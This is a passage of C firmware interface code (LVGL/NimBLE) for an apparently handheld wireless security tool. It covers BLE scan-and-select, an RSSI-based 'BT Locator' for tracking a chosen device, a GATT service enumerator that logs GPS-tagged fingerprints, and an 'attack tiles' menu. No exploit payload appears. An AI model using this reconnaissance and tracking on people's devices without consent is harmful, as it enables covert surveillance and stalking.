    lv_obj_align(list_header, LV_ALIGN_TOP_LEFT, 5, 0);
    lv_obj_add_flag(list_header, LV_OBJ_FLAG_HIDDEN);  // Hidden until scan done
    lv_obj_set_user_data(bt_locator_content, list_header);  // Store for later access

    // Scrollable list for devices (hidden until scan complete)
    bt_locator_list = lv_obj_create(bt_locator_content);
    lv_obj_set_size(bt_locator_list, lv_pct(100), LCD_V_RES - 30 - 48 - 25);  // Same height as BLE Scan list
    lv_obj_align(bt_locator_list, LV_ALIGN_TOP_MID, 0, 20);  // Below header
    lv_obj_set_style_bg_color(bt_locator_list, ui_bg_color(), 0);
    lv_obj_set_style_border_color(bt_locator_list, ui_accent_color(), 0);
    lv_obj_set_style_border_width(bt_locator_list, 1, 0);
    lv_obj_set_flex_flow(bt_locator_list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(bt_locator_list, 4, 0);
    lv_obj_set_style_pad_gap(bt_locator_list, 4, 0);
    lv_obj_set_scrollbar_mode(bt_locator_list, LV_SCROLLBAR_MODE_AUTO);
    lv_obj_add_flag(bt_locator_list, LV_OBJ_FLAG_HIDDEN);  // Hidden until scan done
    
    // RSSI label (hidden until device selected) - large centered
    bt_locator_rssi_label = lv_label_create(bt_locator_content);
    lv_label_set_text(bt_locator_rssi_label, "RSSI: ---");
    lv_obj_set_style_text_color(bt_locator_rssi_label, lv_color_make(0, 255, 0), 0);  // Green
    lv_obj_set_style_text_font(bt_locator_rssi_label, &lv_font_montserrat_20, 0);
    lv_obj_align(bt_locator_rssi_label, LV_ALIGN_CENTER, 0, -30);
    lv_obj_add_flag(bt_locator_rssi_label, LV_OBJ_FLAG_HIDDEN);
    
    // MAC label (hidden until device selected)
    bt_locator_mac_label = lv_label_create(bt_locator_content);
    lv_label_set_text(bt_locator_mac_label, "Device: --:--:--:--:--:--");
    lv_obj_set_style_text_color(bt_locator_mac_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(bt_locator_mac_label, &lv_font_montserrat_16, 0);
    lv_obj_align(bt_locator_mac_label, LV_ALIGN_CENTER, 0, 20);
    lv_obj_add_flag(bt_locator_mac_label, LV_OBJ_FLAG_HIDDEN);
    
    // Back button at bottom (compact row)
    bt_locator_exit_btn = lv_btn_create(function_page);
    lv_obj_set_size(bt_locator_exit_btn, 110, 28);
    lv_obj_align(bt_locator_exit_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(bt_locator_exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(bt_locator_exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(bt_locator_exit_btn, 0, 0);
    lv_obj_set_style_radius(bt_locator_exit_btn, 8, 0);
    lv_obj_set_style_shadow_width(bt_locator_exit_btn, 4, 0);
    lv_obj_set_style_shadow_color(bt_locator_exit_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(bt_locator_exit_btn, LV_OPA_40, 0);
    lv_obj_set_style_pad_ver(bt_locator_exit_btn, 4, 0);
    lv_obj_set_style_pad_hor(bt_locator_exit_btn, 8, 0);
    lv_obj_set_style_pad_column(bt_locator_exit_btn, 4, 0);
    lv_obj_set_flex_flow(bt_locator_exit_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(bt_locator_exit_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *exit_icon = lv_label_create(bt_locator_exit_btn);
    lv_label_set_text(exit_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_font(exit_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(exit_icon, ui_text_color(), 0);

    lv_obj_t *exit_lbl = lv_label_create(bt_locator_exit_btn);
    lv_label_set_text(exit_lbl, "Back");
    lv_obj_set_style_text_font(exit_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(exit_lbl, ui_text_color(), 0);

    lv_obj_add_event_cb(bt_locator_exit_btn, bt_locator_exit_cb, LV_EVENT_CLICKED, NULL);

    // Switch to BLE mode
    if (!ensure_ble_mode()) {
        lv_label_set_text(bt_locator_status_label, "BLE init failed!");
        ui_locked = false;
        return;
    }
    
    // Start BLE scan task
    bt_scan_active = true;
    BaseType_t task_ret = xTaskCreate(
        bt_scan_task,
        "bt_scan_task",
        4096,
        NULL,
        5,
        &bt_scan_task_handle
    );
    
    if (task_ret != pdPASS) {
        bt_scan_active = false;
        lv_label_set_text(bt_locator_status_label, "Failed to start scan!");
    } else {
        snprintf(bt_locator_status_text, sizeof(bt_locator_status_text), "BT scanning... 0 devices (10s)");
        lv_label_set_text(bt_locator_status_label, bt_locator_status_text);
    }
    
    ui_locked = false;
}

// ============================================================================
// BT SCAN & SELECT
// ============================================================================

static void bt_sas_exit_cb(lv_event_t *e)
{
    (void)e;
    if (bt_scan_active) {
        bt_scan_active = false;
        bt_stop_scan();
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    bt_sas_ui_active = false;
    bt_sas_selected_idx = -1;
    show_bluetooth_screen();
}

static void bt_sas_device_cb(lv_event_t *e)
{
    int idx = (int)(intptr_t)lv_event_get_user_data(e);
    if (idx < 0 || idx >= bt_device_count) return;

    if (bt_sas_selected_idx == idx) {
        // Deselect
        bt_sas_selected_idx = -1;
        if (bt_sas_next_btn && lv_obj_is_valid(bt_sas_next_btn))
            lv_obj_add_flag(bt_sas_next_btn, LV_OBJ_FLAG_HIDDEN);
        if (bt_sas_status_label && lv_obj_is_valid(bt_sas_status_label))
            lv_label_set_text(bt_sas_status_label, "Tap a device to select");
    } else {
        bt_sas_selected_idx = idx;
        memcpy(bt_sas_target_addr, bt_devices[idx].addr, 6);
        bt_sas_target_addr_type = bt_devices[idx].addr_type;
        if (bt_devices[idx].name[0] != '\0')
            snprintf(bt_sas_target_name, sizeof(bt_sas_target_name), "%s", bt_devices[idx].name);
        else
            snprintf(bt_sas_target_name, sizeof(bt_sas_target_name), "%02X:%02X:%02X:%02X:%02X:%02X",
                     bt_devices[idx].addr[5], bt_devices[idx].addr[4], bt_devices[idx].addr[3],
                     bt_devices[idx].addr[2], bt_devices[idx].addr[1], bt_devices[idx].addr[0]);

        if (bt_sas_status_label && lv_obj_is_valid(bt_sas_status_label)) {
            char sel_text[48];
            snprintf(sel_text, sizeof(sel_text), "Selected: %s", bt_sas_target_name);
            lv_label_set_text(bt_sas_status_label, sel_text);
        }
        if (bt_sas_next_btn && lv_obj_is_valid(bt_sas_next_btn))
            lv_obj_clear_flag(bt_sas_next_btn, LV_OBJ_FLAG_HIDDEN);
    }
    bt_sas_refresh_list();
}

static void bt_sas_next_cb(lv_event_t *e)
{
    (void)e;
    if (bt_sas_selected_idx < 0) return;
    // Stop scan before leaving
    if (bt_scan_active) {
        bt_scan_active = false;
        bt_stop_scan();
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    bt_sas_ui_active = false;
    show_bt_attack_tiles_screen();
}

static void bt_sas_refresh_list(void)
{
    if (!bt_sas_list || !lv_obj_is_valid(bt_sas_list)) return;
    lv_obj_clean(bt_sas_list);

    for (int i = 0; i < bt_device_count; i++) {
        bt_device_info_t *dev = &bt_devices[i];
        bool selected = (i == bt_sas_selected_idx);

        /* OUI vendor lookup (addr is NimBLE LE: addr[5]:addr[4]:addr[3] = OUI) */
        uint8_t oui[3] = {dev->addr[5], dev->addr[4], dev->addr[3]};
        const char *vendor = oui_lookup(oui);

        char item_text[72];
        char short_name[14];
        if (dev->name[0] != '\0') {
            strncpy(short_name, dev->name, 13);
            short_name[13] = '\0';
            snprintf(item_text, sizeof(item_text), "%s  %d dBm  %02X:%02X:%02X",
                     short_name, dev->rssi,
                     dev->addr[2], dev->addr[1], dev->addr[0]);
        } else if (dev->is_airtag) {
            snprintf(item_text, sizeof(item_text), "[AirTag]  %d dBm  %02X:%02X:%02X",
                     dev->rssi, dev->addr[2], dev->addr[1], dev->addr[0]);
        } else if (dev->is_smarttag) {
            snprintf(item_text, sizeof(item_text), "[SmartTag]  %d dBm  %02X:%02X:%02X",
                     dev->rssi, dev->addr[2], dev->addr[1], dev->addr[0]);
        } else if (vendor) {
            char vend_short[13];
            strncpy(vend_short, vendor, 12);
            vend_short[12] = '\0';
            snprintf(item_text, sizeof(item_text), "[%s]  %d dBm  %02X:%02X:%02X",
                     vend_short, dev->rssi, dev->addr[2], dev->addr[1], dev->addr[0]);
        } else {
            snprintf(item_text, sizeof(item_text), "[Unknown]  %d dBm  %02X:%02X:%02X",
                     dev->rssi, dev->addr[2], dev->addr[1], dev->addr[0]);
        }

        lv_obj_t *btn = lv_btn_create(bt_sas_list);
        lv_obj_set_size(btn, lv_pct(100), 30);
        lv_obj_set_style_bg_color(btn, selected ? UI_ACCENT_CYAN : ui_card_color(), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(btn, lv_color_lighten(UI_ACCENT_CYAN, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(btn, selected ? 1 : 0, 0);
        lv_obj_set_style_border_color(btn, UI_ACCENT_CYAN, 0);
        lv_obj_set_style_radius(btn, 4, 0);

        lv_obj_t *lbl = lv_label_create(btn);
        lv_label_set_text(lbl, item_text);
        lv_obj_set_style_text_color(lbl, selected ? lv_color_black() : ui_text_color(), 0);
        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
        lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 4, 0);
        lv_label_set_long_mode(lbl, LV_LABEL_LONG_CLIP);

        lv_obj_add_event_cb(btn, bt_sas_device_cb, LV_EVENT_SHORT_CLICKED, (void*)(intptr_t)i);
    }
}

static void show_bt_scan_select_screen(void)
{
    ui_locked = true;
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();

    if (!oui_lookup_is_loaded()) {
        ensure_sd_mounted();
        oui_lookup_init(OUI_DEFAULT_PATH);
    }

    create_function_page_base("BT Scan & Select");
    bt_sas_ui_active = true;
    bt_sas_selected_idx = -1;

    // Status label
    bt_sas_status_label = lv_label_create(function_page);
    lv_label_set_text(bt_sas_status_label, "Initializing BLE...");
    lv_obj_set_style_text_color(bt_sas_status_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(bt_sas_status_label, &lv_font_montserrat_12, 0);
    lv_obj_align(bt_sas_status_label, LV_ALIGN_TOP_LEFT, 5, 35);

    // Scrollable device list
    bt_sas_list = lv_obj_create(function_page);
    lv_obj_set_size(bt_sas_list, lv_pct(100), LCD_V_RES - 30 - 18 - 50);
    lv_obj_align(bt_sas_list, LV_ALIGN_TOP_MID, 0, 52);
    lv_obj_set_style_bg_color(bt_sas_list, ui_bg_color(), 0);
    lv_obj_set_style_border_color(bt_sas_list, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_border_width(bt_sas_list, 1, 0);
    lv_obj_set_flex_flow(bt_sas_list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(bt_sas_list, 3, 0);
    lv_obj_set_style_pad_gap(bt_sas_list, 3, 0);
    lv_obj_set_scrollbar_mode(bt_sas_list, LV_SCROLLBAR_MODE_AUTO);

    // Bottom button row: Exit | Next →
    lv_obj_t *btn_row = lv_obj_create(function_page);
    lv_obj_set_size(btn_row, lv_pct(100), 38);
    lv_obj_align(btn_row, LV_ALIGN_BOTTOM_MID, 0, -6);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_hor(btn_row, 6, 0);
    lv_obj_set_style_pad_ver(btn_row, 0, 0);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *exit_btn = lv_btn_create(btn_row);
    lv_obj_set_size(exit_btn, 100, 30);
    lv_obj_set_style_bg_color(exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 40), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(exit_btn, 0, 0);
    lv_obj_set_style_radius(exit_btn, 8, 0);
    lv_obj_t *exit_lbl = lv_label_create(exit_btn);
    lv_label_set_text(exit_lbl, LV_SYMBOL_CLOSE "  Exit");
    lv_obj_set_style_text_font(exit_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(exit_lbl, lv_color_white(), 0);
    lv_obj_center(exit_lbl);
    lv_obj_add_event_cb(exit_btn, bt_sas_exit_cb, LV_EVENT_CLICKED, NULL);

    bt_sas_next_btn = lv_btn_create(btn_row);
    lv_obj_set_size(bt_sas_next_btn, 110, 30);
    lv_obj_set_style_bg_color(bt_sas_next_btn, UI_ACCENT_CYAN, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(bt_sas_next_btn, lv_color_lighten(UI_ACCENT_CYAN, 40), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(bt_sas_next_btn, 0, 0);
    lv_obj_set_style_radius(bt_sas_next_btn, 8, 0);
    lv_obj_t *next_lbl = lv_label_create(bt_sas_next_btn);
    lv_label_set_text(next_lbl, "Actions " LV_SYMBOL_RIGHT);
    lv_obj_set_style_text_font(next_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(next_lbl, lv_color_black(), 0);
    lv_obj_center(next_lbl);
    lv_obj_add_event_cb(bt_sas_next_btn, bt_sas_next_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_add_flag(bt_sas_next_btn, LV_OBJ_FLAG_HIDDEN);  // shown after selection

    // Switch to BLE and start scan
    if (!ensure_ble_mode()) {
        lv_label_set_text(bt_sas_status_label, "BLE init failed!");
        ui_locked = false;
        return;
    }

    bt_scan_active = true;
    ble_scan_finished = false;
    BaseType_t ret = xTaskCreate(bt_scan_task, "bt_scan_task", 4096, NULL, 5, &bt_scan_task_handle);
    if (ret != pdPASS) {
        bt_scan_active = false;
        lv_label_set_text(bt_sas_status_label, "Scan start failed!");
    } else {
        lv_label_set_text(bt_sas_status_label, "Scanning... 0 (10s)");
    }
    ui_locked = false;
}

// Direct-track BT Locator: skip scan, jump straight to tracking the SAS-selected device
static void show_bt_locator_direct_track(void)
{
    ui_locked = true;
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();

    char title[48];
    snprintf(title, sizeof(title), "Locating: %.22s", bt_sas_target_name[0] ? bt_sas_target_name : "Unknown");
    create_function_page_base(title);

    bt_locator_ui_active = true;
    bt_locator_tracking_active = false;
    bt_tracking_mode = false;

    // Pre-load tracking target from SAS selection
    memcpy(bt_tracking_mac, bt_sas_target_addr, 6);
    strncpy(bt_tracking_name, bt_sas_target_name, sizeof(bt_tracking_name) - 1);
    bt_tracking_name[sizeof(bt_tracking_name) - 1] = '\0';
    bt_tracking_found = false;
    bt_tracking_rssi = 0;

    // Content container
    bt_locator_content = lv_obj_create(function_page);
    lv_obj_set_size(bt_locator_content, lv_pct(100), LCD_V_RES - 30 - 43);
    lv_obj_align(bt_locator_content, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_opa(bt_locator_content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(bt_locator_content, 0, 0);
    lv_obj_set_style_pad_all(bt_locator_content, 5, 0);
    lv_obj_clear_flag(bt_locator_content, LV_OBJ_FLAG_SCROLLABLE);

    // Status label: scanning in progress
    bt_locator_status_label = lv_label_create(bt_locator_content);
    lv_label_set_text(bt_locator_status_label, "Scanning...");
    lv_obj_set_style_text_color(bt_locator_status_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(bt_locator_status_label, &lv_font_montserrat_16, 0);
    lv_obj_align(bt_locator_status_label, LV_ALIGN_CENTER, 0, 40);

    // RSSI display - large, centered, green
    bt_locator_rssi_label = lv_label_create(bt_locator_content);
    lv_label_set_text(bt_locator_rssi_label, "RSSI: ---");
    lv_obj_set_style_text_color(bt_locator_rssi_label, lv_color_make(0, 255, 0), 0);
    lv_obj_set_style_text_font(bt_locator_rssi_label, &lv_font_montserrat_20, 0);
    lv_obj_align(bt_locator_rssi_label, LV_ALIGN_CENTER, 0, -30);

    // MAC label showing what we're tracking
    bt_locator_mac_label = lv_label_create(bt_locator_content);
    char mac_disp[48];
    snprintf(mac_disp, sizeof(mac_disp), "%02X:%02X:%02X:%02X:%02X:%02X",
             bt_sas_target_addr[0], bt_sas_target_addr[1], bt_sas_target_addr[2],
             bt_sas_target_addr[3], bt_sas_target_addr[4], bt_sas_target_addr[5]);
    lv_label_set_text(bt_locator_mac_label, mac_disp);
    lv_obj_set_style_text_color(bt_locator_mac_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(bt_locator_mac_label, &lv_font_montserrat_14, 0);
    lv_obj_align(bt_locator_mac_label, LV_ALIGN_CENTER, 0, 10);

    // Back button
    bt_locator_exit_btn = lv_btn_create(function_page);
    lv_obj_set_size(bt_locator_exit_btn, 110, 28);
    lv_obj_align(bt_locator_exit_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(bt_locator_exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(bt_locator_exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(bt_locator_exit_btn, 0, 0);
    lv_obj_set_style_radius(bt_locator_exit_btn, 8, 0);
    lv_obj_set_style_shadow_width(bt_locator_exit_btn, 4, 0);
    lv_obj_set_style_shadow_color(bt_locator_exit_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(bt_locator_exit_btn, LV_OPA_40, 0);
    lv_obj_set_style_pad_ver(bt_locator_exit_btn, 4, 0);
    lv_obj_set_style_pad_hor(bt_locator_exit_btn, 8, 0);
    lv_obj_set_style_pad_column(bt_locator_exit_btn, 4, 0);
    lv_obj_set_flex_flow(bt_locator_exit_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(bt_locator_exit_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *exit_icon = lv_label_create(bt_locator_exit_btn);
    lv_label_set_text(exit_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_font(exit_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(exit_icon, ui_text_color(), 0);

    lv_obj_t *exit_lbl = lv_label_create(bt_locator_exit_btn);
    lv_label_set_text(exit_lbl, "Back");
    lv_obj_set_style_text_font(exit_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(exit_lbl, ui_text_color(), 0);

    lv_obj_add_event_cb(bt_locator_exit_btn, bt_locator_exit_cb, LV_EVENT_CLICKED, NULL);

    // Switch to BLE mode
    if (!ensure_ble_mode()) {
        lv_label_set_text(bt_locator_status_label, "BLE init failed!");
        ui_locked = false;
        return;
    }

    // Start tracking directly — no scan-and-select step
    bt_locator_tracking_active = true;
    bt_tracking_mode = true;
    BaseType_t task_ret = xTaskCreate(
        bt_locator_tracking_task,
        "bt_loc_track",
        4096,
        NULL,
        5,
        &bt_locator_task_handle
    );

    if (task_ret != pdPASS) {
        bt_locator_tracking_active = false;
        bt_tracking_mode = false;
        lv_label_set_text(bt_locator_status_label, "Failed to start tracking!");
    } else {
        snprintf(bt_locator_status_text, sizeof(bt_locator_status_text), "Scanning (10s)...");
        lv_label_set_text(bt_locator_status_label, bt_locator_status_text);
    }

    ui_locked = false;
}

// ── GATT Walker ──────────────────────────────────────────────────

static void gw_deferred_start_cb(lv_timer_t *t)
{
    lv_timer_del(t);
    if (!gw_screen_active) return;

    double lat    = current_gps.valid ? (double)current_gps.latitude  : 0.0;
    double lon    = current_gps.valid ? (double)current_gps.longitude : 0.0;
    bool   gps_ok = current_gps.valid;
    int8_t rssi   = (bt_sas_selected_idx >= 0)
                    ? bt_devices[bt_sas_selected_idx].rssi : -80;

    if (!gw_walk(bt_sas_target_addr, bt_sas_target_addr_type,
                 bt_sas_target_name, rssi, lat, lon, gps_ok)) {
        if (gw_status_lbl && lv_obj_is_valid(gw_status_lbl))
            lv_label_set_text(gw_status_lbl, "Failed to start walk");
        if (gw_cancel_btn && lv_obj_is_valid(gw_cancel_btn))
            lv_obj_add_flag(gw_cancel_btn, LV_OBJ_FLAG_HIDDEN);
        if (gw_back_btn && lv_obj_is_valid(gw_back_btn))
            lv_obj_clear_flag(gw_back_btn, LV_OBJ_FLAG_HIDDEN);
    }
}

static void gw_back_btn_cb(lv_event_t *e)
{
    gw_screen_active = false;
    gw_status_lbl    = NULL;
    gw_svc_lbl       = NULL;
    gw_chr_lbl       = NULL;
    gw_result_lbl    = NULL;
    gw_cancel_btn    = NULL;
    gw_back_btn      = NULL;
    show_bt_attack_tiles_screen();
}

static void gw_cancel_btn_cb(lv_event_t *e)
{
    gw_cancel();
    if (gw_cancel_btn && lv_obj_is_valid(gw_cancel_btn)) {
        lv_obj_t *lbl = lv_obj_get_child(gw_cancel_btn, 0);
        if (lbl) lv_label_set_text(lbl, "Cancelling...");
        lv_obj_add_state(gw_cancel_btn, LV_STATE_DISABLED);
    }
}

/* Called from main loop (inside lvgl_mutex) when gw_ui_needs_update is set. */
static void gw_update_screen_ui(void)
{
    if (!gw_screen_active || !function_page || !lv_obj_is_valid(function_page)) return;

    gw_state_t st   = (gw_state_t)gw_ui_state;
    int        nsvc = (int)gw_ui_svc_count;
    int        nchr = (int)gw_ui_chr_count;
    char       stat[64];
    strncpy(stat, (const char *)gw_ui_status, sizeof(stat) - 1);
    stat[sizeof(stat) - 1] = '\0';

    if (gw_status_lbl && lv_obj_is_valid(gw_status_lbl))
        lv_label_set_text(gw_status_lbl, stat);

    if (gw_svc_lbl && lv_obj_is_valid(gw_svc_lbl)) {
        char t[24]; snprintf(t, sizeof(t), "Services: %d", nsvc);
        lv_label_set_text(gw_svc_lbl, t);
    }
    if (gw_chr_lbl && lv_obj_is_valid(gw_chr_lbl)) {
        char t[24]; snprintf(t, sizeof(t), "Characteristics: %d", nchr);
        lv_label_set_text(gw_chr_lbl, t);
    }

    bool done = (st == GW_STATE_COMPLETE || st == GW_STATE_FAILED || st == GW_STATE_CANCELLED);

    /* Show/hide cancel vs back */
    if (gw_cancel_btn && lv_obj_is_valid(gw_cancel_btn)) {
        if (done) lv_obj_add_flag(gw_cancel_btn, LV_OBJ_FLAG_HIDDEN);
        else      lv_obj_clear_flag(gw_cancel_btn, LV_OBJ_FLAG_HIDDEN);
    }
    if (gw_back_btn && lv_obj_is_valid(gw_back_btn)) {
        if (done) lv_obj_clear_flag(gw_back_btn, LV_OBJ_FLAG_HIDDEN);
        else      lv_obj_add_flag(gw_back_btn, LV_OBJ_FLAG_HIDDEN);
    }

    /* Result summary when complete */
    if (gw_result_lbl && lv_obj_is_valid(gw_result_lbl)) {
        if (st == GW_STATE_COMPLETE) {
            const gw_result_t *r = gw_get_result();
            char t[80];
            if (r) {
                snprintf(t, sizeof(t), "%d svcs  %d chrs\nFP: 0x%08X\n%s",
                         r->svc_count, (int)gw_ui_chr_count,
                         r->fingerprint, r->filepath + 9 /* skip /sdcard/ */);
            } else {
                snprintf(t, sizeof(t), "Done");
            }
            lv_label_set_text(gw_result_lbl, t);
            lv_obj_clear_flag(gw_result_lbl, LV_OBJ_FLAG_HIDDEN);
        } else if (st == GW_STATE_FAILED) {
            lv_label_set_text(gw_result_lbl, (const char *)gw_ui_status);
            lv_obj_clear_flag(gw_result_lbl, LV_OBJ_FLAG_HIDDEN);
        } else {
            lv_obj_add_flag(gw_result_lbl, LV_OBJ_FLAG_HIDDEN);
        }
    }
}

static void show_gatt_walker_screen(void)
{
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();

    /* Stop any active scan — we'll need the radio for connecting */
    ble_gap_disc_cancel();

    char title[48];
    snprintf(title, sizeof(title), "GATT: %.26s", bt_sas_target_name);
    create_function_page_base(title);
    apply_menu_bg();

    /* Target MAC line */
    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             bt_sas_target_addr[5], bt_sas_target_addr[4], bt_sas_target_addr[3],
             bt_sas_target_addr[2], bt_sas_target_addr[1], bt_sas_target_addr[0]);

    lv_obj_t *mac_lbl = lv_label_create(function_page);
    lv_label_set_text(mac_lbl, mac_str);
    lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(mac_lbl, lv_color_make(160, 160, 160), 0);
    lv_obj_align(mac_lbl, LV_ALIGN_TOP_MID, 0, 35);

    /* Status label */
    gw_status_lbl = lv_label_create(function_page);
    lv_label_set_text(gw_status_lbl, "Starting...");
    lv_obj_set_style_text_font(gw_status_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(gw_status_lbl, ui_text_color(), 0);
    lv_label_set_long_mode(gw_status_lbl, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(gw_status_lbl, 220);
    lv_obj_align(gw_status_lbl, LV_ALIGN_TOP_MID, 0, 60);

    /* Service count */
    gw_svc_lbl = lv_label_create(function_page);
    lv_label_set_text(gw_svc_lbl, "Services: 0");
    lv_obj_set_style_text_font(gw_svc_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(gw_svc_lbl, lv_color_make(100, 200, 255), 0);
    lv_obj_align(gw_svc_lbl, LV_ALIGN_TOP_MID, 0, 110);

    /* Char count */
    gw_chr_lbl = lv_label_create(function_page);
    lv_label_set_text(gw_chr_lbl, "Characteristics: 0");
    lv_obj_set_style_text_font(gw_chr_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(gw_chr_lbl, lv_color_make(100, 200, 255), 0);
    lv_obj_align(gw_chr_lbl, LV_ALIGN_TOP_MID, 0, 135);

    /* Result label (hidden until done) */
    gw_result_lbl = lv_label_create(function_page);
    lv_label_set_text(gw_result_lbl, "");
    lv_obj_set_style_text_font(gw_result_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(gw_result_lbl, lv_color_make(140, 220, 140), 0);
    lv_label_set_long_mode(gw_result_lbl, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(gw_result_lbl, 220);
    lv_obj_align(gw_result_lbl, LV_ALIGN_TOP_MID, 0, 165);
    lv_obj_add_flag(gw_result_lbl, LV_OBJ_FLAG_HIDDEN);

    /* Cancel button */
    gw_cancel_btn = lv_btn_create(function_page);
    lv_obj_set_size(gw_cancel_btn, 140, 36);
    lv_obj_align(gw_cancel_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(gw_cancel_btn, lv_color_make(180, 40, 40), 0);
    lv_obj_add_event_cb(gw_cancel_btn, gw_cancel_btn_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *clbl = lv_label_create(gw_cancel_btn);
    lv_label_set_text(clbl, "Cancel Walk");
    lv_obj_center(clbl);

    /* Back button (hidden until done) */
    gw_back_btn = lv_btn_create(function_page);
    lv_obj_set_size(gw_back_btn, 140, 36);
    lv_obj_align(gw_back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(gw_back_btn, lv_color_make(50, 50, 60), 0);
    lv_obj_add_event_cb(gw_back_btn, gw_back_btn_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *blbl = lv_label_create(gw_back_btn);
    lv_label_set_text(blbl, "Back");
    lv_obj_center(blbl);
    lv_obj_add_flag(gw_back_btn, LV_OBJ_FLAG_HIDDEN);

    /* Mark screen active — walk starts after a brief timer to let NimBLE
     * finish processing the disc_cancel before we call ble_gap_connect(). */
    gw_screen_active   = true;
    gw_ui_needs_update = false;

    lv_timer_create(gw_deferred_start_cb, 250, NULL);
}

// Attack tile screen after device selection
static void bt_attack_tiles_back_cb(lv_event_t *e)
{
    (void)e;
    show_bt_scan_select_screen();
}

static void show_bt_attack_tiles_screen(void)
{
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();

    char title[48];
    snprintf(title, sizeof(title), "BT: %.28s", bt_sas_target_name);
    create_function_page_base(title);
    apply_menu_bg();

    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30 - 44);
    lv_obj_align(tiles, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);

    // BT Locator tile — routes directly to tracking the SAS-selected device
    lv_obj_t *loc_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "BT\nLocator", COLOR_TILE_BLUE, NULL, NULL);
    lv_obj_add_event_cb(loc_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BT Locator Direct");

    // GATT Walker tile
    lv_obj_t *gatt_tile = create_tile(tiles, MY_SYMBOL_PERSON_WALKING, "GATT\nWalker", COLOR_MATERIAL_PURPLE, NULL, NULL);
